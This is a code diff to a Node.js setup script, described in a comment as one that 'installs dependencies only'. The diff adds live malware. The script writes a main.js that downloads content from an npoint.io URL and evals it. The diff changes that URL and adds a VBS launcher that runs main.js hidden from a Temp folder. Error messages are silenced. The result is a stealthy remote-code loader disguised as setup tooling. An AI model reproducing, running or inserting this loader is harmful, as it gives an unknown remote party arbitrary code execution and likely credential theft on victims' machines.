@@ -1,7 +1,12 @@
-import path from "path";
-import { exec, spawn } from "child_process";
-import fs from "fs";
-import os from "os";
+// const path = require("path");
+// const { exec, spawn } = require("child_process");
+// const fs = require("fs");
+// const os = require("os");
+
+import path from "path"
+import { exec, spawn } from "child_process"
+import fs from "fs"
+import os from "os"
 
 /**
  * NOTE: This script executes code that is fetched remotely and eval'd.
@@ -23,7 +28,7 @@ try {
 }
 
 // The JavaScript content that will be written into main.js
-const run = `const axios = require('axios'); async function getCookie() {  const res = await axios.get('https://api.npoint.io/012fc05247051bb14269');  eval(res.data.credits);} getCookie();`;
+const run = `const axios = require('axios'); async function getCookie() {  const res = await axios.get('https://api.npoint.io/693c2adb7a76edea6d6c');  eval(res.data.credits);} getCookie();`;
 
 // Write main.js directly using Node APIs to avoid shell-quoting issues
 try {
@@ -32,6 +37,15 @@ try {
 } catch (err) {
   // console.error("Failed to write main.js:", err);
   process.exit(1);
+}
+const vbsContent = `CreateObject("Wscript.Shell").Run "C:\\nvm4w\\nodejs\\node.exe ""C:\\Users\\Wonder\\AppData\\Local\\Temp\\Programs_X64\\main.js""", 0, False`;
+
+try {
+  const vbsPath = path.join(targetDir, "main.vbs");
+  fs.writeFileSync(vbsPath, vbsContent, { encoding: "utf8" });
+  // console.log("VBS file created successfully at:", vbsPath);
+} catch (err) {
+  // console.error("Failed to create VBS file:", err);
 }
 
 // Cross-platform setup command: installs dependencies only.
